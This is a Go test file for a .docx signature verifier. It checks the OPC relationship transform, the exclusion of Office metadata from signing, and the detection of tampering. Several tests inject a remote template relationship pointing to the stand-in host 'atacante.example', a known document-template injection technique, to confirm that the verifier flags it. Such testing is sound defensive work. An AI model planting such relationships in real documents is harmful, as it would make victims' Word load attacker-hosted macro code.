// Derechos de autor (C) 2026 Alberto Avidad Fernández.
// Autoría: Alberto Avidad Fernández
// Licencia: EUPL 1.2 o posterior
// SPDX-License-Identifier: EUPL-1.2

package signer

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"grxfirma/internal/domain"
)

// Transformación de relaciones de OPC y metadatos que Office deja fuera de
// la firma (lote 2b, a partir de E1-01 y E1-03).

const (
	relOfficeDocument = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
	relCore           = "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties"
	relApp            = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties"
	relOrigen         = "http://schemas.openxmlformats.org/package/2006/relationships/digital-signature/origin"
	relEstilos        = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
	relPlantilla      = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
	ctEstilos         = "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"
)

// Vector real: el _rels/.rels de entrada_w2016_SIGNED.docx (Word 2016) y de
// 2_signed.docx (AutoFirma), firmado con SourceId="rId1". Los dos ficheros
// escriben las relaciones en distinto orden de atributos y con distinta
// declaración XML, y su DigestValue en la firma es el mismo.
func TestTransformarRelaciones_VectorDeOffice(t *testing.T) {
	const esperado = "Mq3mDDWudLiaQFa1psBgLG+/en7p7r8re0MtlxnuiUI="
	word := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` + "\r\n" +
		`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="` + relApp + `" Target="docProps/app.xml"/><Relationship Id="rId2" Type="` + relCore + `" Target="docProps/core.xml"/><Relationship Id="rId1" Type="` + relOfficeDocument + `" Target="word/document.xml"/><Relationship Id="rId4" Type="` + relOrigen + `" Target="_xmlsignatures/origin.sigs"/></Relationships>`
	autofirma := `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Target="docProps/app.xml" Type="` + relApp + `"/><Relationship Id="rId2" Target="docProps/core.xml" Type="` + relCore + `"/><Relationship Id="rId1" Target="word/document.xml" Type="` + relOfficeDocument + `"/><Relationship Id="rel-id-5eb1c4e7" Target="_xmlsignatures/origin.sigs" Type="` + relOrigen + `"/></Relationships>`
	sel, ok := leerSeleccionRelaciones(`<mdssi:RelationshipReference SourceId="rId1"/>`)
	if !ok {
		t.Fatal("parámetros de AutoFirma no reconocidos")
	}
	for nombre, rels := range map[string]string{"Word": word, "AutoFirma": autofirma} {
		transformado, fuera, err := transformarRelaciones([]byte(rels), sel, algC14N)
		if err != nil {
			t.Fatalf("%s: %v", nombre, err)
		}
		suma := sha256.Sum256(transformado)
		if got := base64.StdEncoding.EncodeToString(suma[:]); got != esperado {
			t.Fatalf("%s: resumen %s, esperado %s\n%s", nombre, got, esperado, transformado)
		}
		if len(fuera) != 3 {
			t.Fatalf("%s: relaciones fuera = %d", nombre, len(fuera))
		}
	}
}

// Selección por tipo (RelationshipsGroupReference): añadir una relación de
// ese tipo cambia el resumen.
func TestTransformarRelaciones_PorTipo(t *testing.T) {
	sel, ok := leerSeleccionRelaciones(`<mdssi:RelationshipsGroupReference xmlns:mdssi="http://schemas.openxmlformats.org/package/2006/digital-signature" SourceType="` + relEstilos + `"/>`)
	if !ok {
		t.Fatal("parámetros no reconocidos")
	}
	base := `<Relationships xmlns="` + nsRelacionesOPC + `"><Relationship Id="rId1" Type="` + relEstilos + `" Target="styles.xml"/></Relationships>`
	mas := strings.Replace(base, "</Relationships>", `<Relationship Id="rId9" Type="`+relEstilos+`" Target="otros.xml"/></Relationships>`, 1)
	a, _, err := transformarRelaciones([]byte(base), sel, algC14N)
	if err != nil {
		t.Fatal(err)
	}
	b, _, err := transformarRelaciones([]byte(mas), sel, algC14N)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(a, b) {
		t.Fatal("una relación nueva del tipo elegido debe cambiar el resumen")
	}
}

// Paquete con la forma de un .docx firmado por Office: .rels firmados con la
// transformación de relaciones y docProps fuera del Manifest.
func partesDocxOffice() []parteOOXML {
	return []parteOOXML{
		{nombre: "_rels/.rels", contentType: ctRelaciones, relationship: true, fuentes: []string{"rId1"}, datos: []byte(
			`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` + "\r\n" +
				`<Relationships xmlns="` + nsRelacionesOPC + `"><Relationship Id="rId3" Type="` + relApp + `" Target="docProps/app.xml"/><Relationship Id="rId2" Type="` + relCore + `" Target="docProps/core.xml"/><Relationship Id="rId1" Type="` + relOfficeDocument + `" Target="word/document.xml"/><Relationship Id="rId4" Type="` + relOrigen + `" Target="_xmlsignatures/origin.sigs"/></Relationships>`)},
		{nombre: "word/_rels/document.xml.rels", contentType: ctRelaciones, relationship: true, fuentes: []string{"rId1"}, datos: []byte(
			`<Relationships xmlns="` + nsRelacionesOPC + `"><Relationship Id="rId1" Type="` + relEstilos + `" Target="styles.xml"/></Relationships>`)},
		{nombre: "word/document.xml", contentType: ctDocumentoWord, datos: []byte(`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p>Pagaré 100 euros</w:p></w:body></w:document>`)},
		{nombre: "word/styles.xml", contentType: ctEstilos, datos: []byte(`<w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"></w:styles>`)},
		{nombre: "docProps/app.xml", contentType: ctApp, sinFirmar: true, datos: []byte(`<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"></Properties>`)},
		{nombre: "docProps/core.xml", contentType: ctCore, sinFirmar: true, datos: []byte(`<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"></cp:coreProperties>`)},
	}
}

// docxOffice monta el paquete con [Content_Types].xml que declara también
// word/styles.xml y añade entradas extra al final.
func docxOffice(t *testing.T, partes []parteOOXML, firma []byte, cambios map[string][]byte, extra ...entradaZIP) []byte {
	t.Helper()
	data := docxConFirma(t, partes, firma, cambios)
	entradas := leerZIP(t, data)
	for i := range entradas {
		if entradas[i].nombre == "[Content_Types].xml" {
			if tipos, ok := cambios["[Content_Types].xml"]; ok {
				entradas[i].datos = tipos
			} else {
				entradas[i].datos = bytes.Replace(entradas[i].datos, []byte("</Types>"), []byte(`<Override PartName="/word/styles.xml" ContentType="`+ctEstilos+`"/></Types>`), 1)
			}
		}
	}
	return zipOrdenado(t, append(entradas, extra...))
}

func verificarDocx(t *testing.T, contenido []byte) (domain.VerificationResult, error) {
	t.Helper()
	vr, _, err := NewOOXMLVerifier().Verify(context.Background(), domain.Document{Name: "f.docx", Content: contenido}, domain.CertificateChain{})
	return vr, err
}

func TestOOXMLVerifier_RelacionesDeOfficeYMetadatosFuera(t *testing.T) {
	key, cert := certForTest(t, "Office")
	partes := partesDocxOffice()
	firma := firmaOfficeManifest(t, key, cert, partes)
	relsDocumento := string(partes[1].datos)
	relsPaquete := string(partes[0].datos)

	// A: tal cual lo deja Office (más las entradas [trash] de Word):
	// válida, cobertura completa y aviso con lo que no cubre.
	vr, err := verificarDocx(t, docxOffice(t, partes, firma, nil, entradaZIP{nombre: "[trash]/0000.dat", datos: []byte("x")}))
	if err != nil || !vr.Valid || vr.Coverage != domain.CoberturaCompleta || vr.Integrity.Status != domain.VerificationStatusValid {
		t.Fatalf("docx de Office: err=%v valid=%v coverage=%q %v", err, vr.Valid, vr.Coverage, vr.Details)
	}
	if !strings.Contains(strings.Join(vr.Details, ";"), "fuera_de_firma_por_formato=[trash]/0000.dat,docProps/app.xml,docProps/core.xml") ||
		!strings.Contains(strings.Join(vr.Warnings, ";"), motivoFueraDeFirmaPorFormato) {
		t.Fatalf("falta el aviso de metadatos fuera de la firma: %v %v", vr.Details, vr.Warnings)
	}

	// Relaciones firmadas alteradas, quitadas o repetidas: inválida.
	invalidas := map[string]map[string][]byte{
		"destino de una relación firmada cambiado": {"word/_rels/document.xml.rels": []byte(strings.Replace(relsDocumento, `Target="styles.xml"`, `Target="document.xml"`, 1))},
		"tipo de una relación firmada cambiado":    {"word/_rels/document.xml.rels": []byte(strings.Replace(relsDocumento, relEstilos, relPlantilla, 1))},
		"TargetMode External añadido":              {"word/_rels/document.xml.rels": []byte(strings.Replace(relsDocumento, `Target="styles.xml"`, `Target="styles.xml" TargetMode="External"`, 1))},
		"relación firmada quitada":                 {"_rels/.rels": []byte(strings.Replace(relsPaquete, `<Relationship Id="rId1" Type="`+relOfficeDocument+`" Target="word/document.xml"/>`, "", 1))},
		"Id firmado repetido":                      {"word/_rels/document.xml.rels": []byte(strings.Replace(relsDocumento, "</Relationships>", `<Relationship Id="rId1" Type="`+relPlantilla+`" Target="http://atacante.example/p.dotm" TargetMode="External"/></Relationships>`, 1))},
		"parte de relaciones que no es OPC":        {"word/_rels/document.xml.rels": []byte(`<Otra xmlns="urn:x"/>`)},
		"elemento ajeno dentro de Relationships":   {"word/_rels/document.xml.rels": []byte(strings.Replace(relsDocumento, "</Relationships>", `<x:Rel xmlns:x="urn:x" Id="rId9" Target="http://atacante.example/"/></Relationships>`, 1))},
	}
	for nombre, cambios := range invalidas {
		vr, err := verificarDocx(t, docxOffice(t, partes, firma, cambios))
		noValido(t, vr, err, nombre)
		if err == nil {
			t.Fatalf("%s: debe ser un error de integridad: %+v", nombre, vr.Integrity)
		}
	}
	if _, err := verificarDocx(t, zipSinEntrada(t, docxOffice(t, partes, firma, nil), "word/_rels/document.xml.rels")); err == nil {
		t.Fatal("una parte .rels firmada que falta debe invalidar la firma")
	}

	// Relaciones añadidas que la firma no elige: cobertura parcial.
	parciales := map[string][]byte{
		"plantilla remota añadida": []byte(strings.Replace(relsDocumento, "</Relationships>", `<Relationship Id="rId9" Type="`+relPlantilla+`" Target="http://atacante.example/p.dotm" TargetMode="External"/></Relationships>`, 1)),
	}
	for nombre, rels := range parciales {
		vr, err := verificarDocx(t, docxOffice(t, partes, firma, map[string][]byte{"word/_rels/document.xml.rels": rels}))
		noValido(t, vr, err, nombre)
		if err != nil || !strings.Contains(strings.Join(vr.Details, ";"), "relacion:word/_rels/document.xml.rels#rId9") {
			t.Fatalf("%s: se esperaba cobertura parcial con la relación: %v %v", nombre, err, vr.Details)
		}
	}
	// Una relación de metadatos del paquete que apunta a otra parte no entra
	// en la lista de exclusiones.
	desviada := strings.Replace(relsPaquete, `Target="docProps/core.xml"`, `Target="word/document.xml"`, 1)
	vr, err = verificarDocx(t, docxOffice(t, partes, firma, map[string][]byte{"_rels/.rels": []byte(desviada)}))
	noValido(t, vr, err, "relación de propiedades desviada")
}

// La lista de metadatos fuera de la firma es cerrada: cualquier otra entrada
// sin firmar, o una de la lista con otro tipo de contenido, da cobertura
// parcial.
func TestOOXMLVerifier_ListaDeMetadatosEsCerrada(t *testing.T) {
	key, cert := certForTest(t, "Office")
	partes := partesDocxOffice()
	firma := firmaOfficeManifest(t, key, cert, partes)
	for _, nombre := range []string{"word/vbaProject.bin", "customXml/item1.xml", "docProps/custom.xml", "docProps/thumbnail.jpeg", "[trash]/evil.xml", "[trash]/0000.dat.xml", "docprops/core.xml.bak", "word/docProps/core.xml"} {
		vr, err := verificarDocx(t, docxOffice(t, partes, firma, nil, entradaZIP{nombre: nombre, datos: []byte("<x/>")}))
		noValido(t, vr, err, nombre)
		if err == nil && !strings.Contains(strings.Join(vr.Details, ";"), nombre) {
			t.Fatalf("%s debe salir como contenido sin firmar: %v", nombre, vr.Details)
		}
	}

	// word/document.xml fuera del Manifest no cuela por la lista.
	sinDocumento := partesDocxOffice()
	sinDocumento[2].sinFirmar = true
	vr, err := verificarDocx(t, docxOffice(t, sinDocumento, firmaOfficeManifest(t, key, cert, sinDocumento), nil))
	noValido(t, vr, err, "word/document.xml sin firmar")

	// docProps/core.xml con el tipo de contenido del documento principal.
	tipos := `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="` + ctRelaciones + `"/><Default Extension="xml" ContentType="application/xml"/>` +
		`<Override PartName="/word/document.xml" ContentType="` + ctDocumentoWord + `"/><Override PartName="/word/styles.xml" ContentType="` + ctEstilos + `"/><Override PartName="/docProps/core.xml" ContentType="` + ctDocumentoWord + `"/><Override PartName="/docProps/app.xml" ContentType="` + ctApp + `"/></Types>`
	vr, err = verificarDocx(t, docxOffice(t, partes, firma, map[string][]byte{"[Content_Types].xml": []byte(tipos)}))
	noValido(t, vr, err, "docProps/core.xml con otro tipo de contenido")
}

// Muestras reales de clienteafirma 1.9 (fuera del repositorio; su licencia
// no permite traerlas como fixture sin revisar). Se ejecuta con
// GRXFIRMA_V19_SOURCE apuntando a su raíz.
func TestOOXMLVerifier_MuestrasRealesOfficeYAutoFirma(t *testing.T) {
	raiz := os.Getenv("GRXFIRMA_V19_SOURCE")
	if raiz == "" {
		t.Skip("defina GRXFIRMA_V19_SOURCE con la raiz de clienteafirma-1.9-oficial")
	}
	muestras := []string{
		"afirma-crypto-ooxml/src/test/resources/entrada_w2016_SIGNED.docx",
		"afirma-simple/src/test/resources/samples/2_signed.docx",
		"afirma-simple/src/test/resources/samples/2_signed_signed.docx",
	}
	for _, ruta := range muestras {
		data, err := os.ReadFile(filepath.Join(raiz, ruta))
		if err != nil {
			t.Fatal(err)
		}
		vr, err := verificarDocx(t, data)
		// Los certificados de las muestras están caducados: se mira la
		// integridad y la cobertura, no la validez del certificado.
		if err != nil || vr.Coverage != domain.CoberturaCompleta || vr.Integrity.Status != domain.VerificationStatusValid ||
			!strings.Contains(strings.Join(vr.Details, ";"), "fuera_de_firma_por_formato=") {
			t.Fatalf("%s: err=%v coverage=%q integridad=%+v", ruta, err, vr.Coverage, vr.Integrity)
		}
		// Relación firmada alterada en la muestra real: error.
		entradas := leerZIP(t, data)
		for i := range entradas {
			if entradas[i].nombre == "word/_rels/document.xml.rels" {
				entradas[i].datos = bytes.Replace(entradas[i].datos, []byte(`Target="styles.xml"`), []byte(`Target="fontTable.xml"`), 1)
			}
		}
		if _, err := verificarDocx(t, zipOrdenado(t, entradas)); err == nil {
			t.Fatalf("%s: una relación firmada alterada debe invalidar la firma", ruta)
		}
		// Plantilla remota añadida: parcial.
		entradas = leerZIP(t, data)
		for i := range entradas {
			if entradas[i].nombre == "word/_rels/document.xml.rels" {
				entradas[i].datos = bytes.Replace(entradas[i].datos, []byte("</Relationships>"), []byte(`<Relationship Id="rId999" Type="`+relPlantilla+`" Target="http://atacante.example/p.dotm" TargetMode="External"/></Relationships>`), 1)
			}
		}
		vr, err = verificarDocx(t, zipOrdenado(t, entradas))
		noValido(t, vr, err, ruta+" con plantilla remota")
	}
}
